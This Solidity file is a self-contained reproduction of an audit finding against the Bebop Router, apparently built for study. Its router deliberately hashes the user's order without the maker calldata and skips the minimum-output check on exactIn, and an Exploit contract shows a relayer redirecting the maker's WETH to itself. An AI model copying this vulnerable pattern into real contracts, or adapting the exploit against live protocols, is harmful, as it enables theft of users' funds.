// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Bebop Router — settle accepts unbound PMM calldata on exactIn (Cyfrin, 66835)
    SYNTHETIC, cheatcode-free reduction.
    Root cause: the user signature hashes the router order and not bebopPmmCalldata.
    A relayer can point the maker output at themselves. exactIn with limitAmount 0
    does not check a minimum received amount. Checks preserved (@> VULN). */

contract ERC20 {
    string public name;
    string public symbol;
    uint8 public immutable decimals;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s, uint8 d) {
        name = n;
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 a) external { balanceOf[to] += a; }

    function approve(address s, uint256 a) external returns (bool) {
        allowance[msg.sender][s] = a;
        return true;
    }

    function transfer(address to, uint256 a) external returns (bool) {
        _move(msg.sender, to, a);
        return true;
    }

    function transferFrom(address from, address to, uint256 a) external returns (bool) {
        uint256 al = allowance[from][msg.sender];
        if (al != type(uint256).max) allowance[from][msg.sender] = al - a;
        _move(from, to, a);
        return true;
    }

    function _move(address from, address to, uint256 a) internal {
        require(balanceOf[from] >= a, "bal");
        balanceOf[from] -= a;
        balanceOf[to] += a;
    }
}

contract BebopRouter {
    struct Order {
        uint256 fromAmount;
        uint256 toAmount;
        int256 limitAmount;
        address fromToken;
        address toToken;
        address tokensOwner;
        address receiver;
        uint256 routerNonce;
    }

    struct Pmm {
        address maker;
        address takerToken;
        address makerToken;
        uint256 takerAmount;
        uint256 makerAmount;
        address receiver;
        uint256 packedCommands;
    }

    mapping(address => bytes32) public signedHash;

    function hashOrder(Order memory o) public pure returns (bytes32) {
        // fromAmount .. routerNonce only. bebopPmmCalldata is not in the hash.
        return keccak256(abi.encode(o.fromAmount, o.toAmount, o.limitAmount, o.fromToken, o.toToken, o.tokensOwner, o.receiver, o.routerNonce)); // STORY2
    }

    function commit(bytes32 h) external { signedHash[msg.sender] = h; }

    function settle(Order calldata order, Pmm calldata pmm) external {
        require(signedHash[order.tokensOwner] == hashOrder(order), "sig"); // STORY3
        require(pmm.takerToken == order.fromToken && pmm.makerToken == order.toToken, "TokenMismatch");
        require(pmm.takerAmount > 0 && pmm.makerAmount > 0, "UnexpectedAmount");
        // receiver and packedCommands are decoded and then discarded
        require(ERC20(order.fromToken).transferFrom(order.tokensOwner, address(this), order.fromAmount), "pull"); // STORY4
        require(ERC20(order.toToken).transferFrom(pmm.maker, pmm.receiver, pmm.makerAmount), "maker"); // STORY5
        uint256 receiverAmount = ERC20(order.toToken).balanceOf(address(this));
        bool isExactOut = order.limitAmount < 0;
        uint256 toAmountAfterFeeSlippage = order.toAmount;
        require(!isExactOut || receiverAmount >= toAmountAfterFeeSlippage, "LimitAmountViolation"); // @> VULN: exactIn skips the quote floor
        // FIX: require(receiverAmount >= toAmountAfterFeeSlippage, "LimitAmountViolation");
        require(order.limitAmount <= 0 || receiverAmount >= uint256(order.limitAmount), "LimitAmountViolation");
        if (receiverAmount > 0) {
            require(ERC20(order.toToken).transfer(order.receiver, receiverAmount), "payout");
        }
    }
}

contract User {
    function commit(BebopRouter r, BebopRouter.Order calldata o) external {
        r.commit(r.hashOrder(o));
    }

    function approve(ERC20 t, address s, uint256 a) external { t.approve(s, a); }
}

contract Maker {
    function approve(ERC20 t, address s) external { t.approve(s, type(uint256).max); }
}

contract Exploit {
    ERC20 public usdc; // nonce 1
    ERC20 public weth; // nonce 2
    User public user; // nonce 3
    Maker public maker; // nonce 4
    BebopRouter public router; // nonce 5

    constructor() {
        usdc = new ERC20("USDC", "USDC", 6);
        weth = new ERC20("WETH", "WETH", 18);
        user = new User();
        maker = new Maker();
        router = new BebopRouter();
        usdc.mint(address(user), 1000e6);
        weth.mint(address(maker), 0.5 ether);
    }

    function run() external {
        BebopRouter.Order memory order = BebopRouter.Order({
            fromAmount: 1000e6,
            toAmount: 0.5 ether,
            limitAmount: 0,
            fromToken: address(usdc),
            toToken: address(weth),
            tokensOwner: address(user),
            receiver: address(user),
            routerNonce: 1
        });
        user.commit(router, order); // STORY1
        user.approve(usdc, address(router), 1000e6);
        maker.approve(weth, address(router));
        BebopRouter.Pmm memory pmm = BebopRouter.Pmm({
            maker: address(maker),
            takerToken: address(usdc),
            makerToken: address(weth),
            takerAmount: 1000e6,
            makerAmount: 0.5 ether,
            receiver: address(this),
            packedCommands: 0
        });
        router.settle(order, pmm);
        require(usdc.balanceOf(address(user)) == 0, "user paid");
        require(weth.balanceOf(address(user)) == 0, "user weth");
        require(weth.balanceOf(address(this)) == 0.5 ether, "attacker"); // STORY6
    }
}
